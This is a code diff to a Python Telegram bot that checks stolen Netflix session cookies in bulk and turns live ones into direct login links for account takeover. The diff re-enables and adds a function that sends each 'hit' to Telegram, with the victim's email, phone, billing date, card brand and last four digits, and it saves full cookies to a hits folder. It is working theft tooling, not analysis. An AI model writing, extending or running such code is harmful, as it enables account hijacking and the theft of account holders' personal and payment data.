@@ -142,11 +142,27 @@ class NetflixBulkChecker:
                     f.write("--- FULL COOKIE ---\n")
                     f.write(result['cookie'])
 
-                # Removed: self.send_hit_to_telegram(result)
+                self.send_hit_to_telegram(result)
                 print(f"\n{Fore.GREEN}[✓] HIT #{self.stats['hits']} Saved{Style.RESET_ALL}")
 
             else:
                 self.stats['bad'] += 1
+
+    def send_hit_to_telegram(self, result):
+        flag = self.get_country_flag(result.get('country_code', 'XX'))
+        msg = f"""
+🔥 <b>NETFLIX PREMIUM HIT #{self.stats['hits']}</b> 🔥
+
+👤 <b>Email:</b> <code>{result.get('email')}</code>
+🌍 <b>Country:</b> {result.get('country_code')} {flag}
+📋 <b>Plan:</b> {result.get('plan')}
+📅 <b>Next Billing:</b> {result.get('next_billing')}
+📞 <b>Phone:</b> {result.get('phone')}
+💳 <b>Card:</b> {result.get('card_brand')} •••• {result.get('last4')}
+👥 <b>Profiles:</b> {result.get('profiles')}
+💾 <b>Saved in hits folder</b>
+"""
+        self.send_telegram(msg)
 
     def start(self, folder):
         files = [os.path.join(root, f) for root, _, fs in os.walk(folder) for f in fs if f.endswith('.txt')]
@@ -165,28 +181,38 @@ class NetflixBulkChecker:
 # ====================== BOT ======================
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    bot.reply_to(message, "📤 Send me **ZIP** file or paste **cookie** directly in chat.")
+    bot.reply_to(message, "📤 Send **ZIP**, **single .txt file**, or paste **cookie** directly.")
 
 @bot.message_handler(content_types=['document'])
-def handle_zip(message):
-    if not message.document.file_name.lower().endswith('.zip'):
-        bot.reply_to(message, "❌ Please send .zip file")
+def handle_file(message):
+    file_name = message.document.file_name.lower()
+    
+    if file_name.endswith('.zip'):
+        bot.reply_to(message, "✅ ZIP received. Checking...")
+        mode = "zip"
+    elif file_name.endswith('.txt'):
+        bot.reply_to(message, "✅ .txt file received. Checking...")
+        mode = "txt"
+    else:
+        bot.reply_to(message, "❌ Only .zip or .txt files allowed.")
         return
-
-    bot.reply_to(message, "✅ ZIP received. Checking...")
 
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded = bot.download_file(file_info.file_path)
 
         with tempfile.TemporaryDirectory() as tmp:
-            zip_path = os.path.join(tmp, "input.zip")
-            with open(zip_path, "wb") as f: f.write(downloaded)
-
-            extract_dir = os.path.join(tmp, "cookies")
-            os.makedirs(extract_dir, exist_ok=True)
-            with zipfile.ZipFile(zip_path, 'r') as z:
-                z.extractall(extract_dir)
+            if mode == "zip":
+                zip_path = os.path.join(tmp, "input.zip")
+                with open(zip_path, "wb") as f: f.write(downloaded)
+                extract_dir = os.path.join(tmp, "cookies")
+                os.makedirs(extract_dir, exist_ok=True)
+                with zipfile.ZipFile(zip_path, 'r') as z:
+                    z.extractall(extract_dir)
+            else:  # single txt
+                extract_dir = tmp
+                txt_path = os.path.join(tmp, file_name)
+                with open(txt_path, "wb") as f: f.write(downloaded)
 
             checker = NetflixBulkChecker(threads=10)
             checker.chat_id = str(message.chat.id)
@@ -211,18 +237,41 @@ def handle_zip(message):
 @bot.message_handler(func=lambda m: True)
 def handle_direct_cookie(message):
     text = message.text.strip()
-    if not ("NetflixId=" in text or "\t" in text):
+    if not text or not ("NetflixId=" in text or "\t" in text):
         return
 
-    bot.reply_to(message, "🔄 Processing single cookie...")
+    bot.reply_to(message, "🔄 Processing cookie...")
 
-    checker = NetflixBulkChecker()
-    checker.chat_id = str(message.chat.id)
-    result = checker.check_cookie(text, "direct_chat")
+    try:
+        checker = NetflixBulkChecker()
+        checker.chat_id = str(message.chat.id)
+        result = checker.check_cookie(text, "direct_chat")
 
-    if result:
-        os.makedirs('hits', exist_ok=True)
-        fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
-        with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
-            f.write(f"Email: {result['email']}\n")
-            f.write(f"
+        if result and result.get('login_url'):
+            bot.reply_to(message, f"✅ **Direct Login Link Ready**\n\n{result['login_url']}")
+            
+            os.makedirs('hits', exist_ok=True)
+            fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
+            with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
+                f.write(f"Email: {result['email']}\n")
+                f.write(f"Plan: {result['plan']}\n")
+                f.write(f"Country: {result['country_code']}\n")
+                f.write(f"Next Billing: {result['next_billing']}\n")
+                f.write(f"Phone: {result['phone']}\n")
+                f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
+                f.write(f"Profiles: {result['profiles']}\n")
+                f.write(f"Login URL: {result['login_url']}\n\n")
+                f.write("--- FULL COOKIE ---\n")
+                f.write(result['cookie'])
+
+            checker.send_hit_to_telegram(result)
+        else:
+            bot.reply_to(message, "❌ Invalid or Dead Cookie")
+
+    except Exception as e:
+        bot.reply_to(message, f"Error: {str(e)}")
+
+if __name__ == "__main__":
+    print("🚀 Netflix Cookie Checker Bot Started")
+    bot.remove_webhook()
+    bot.infinity_polling(skip_pending=True)
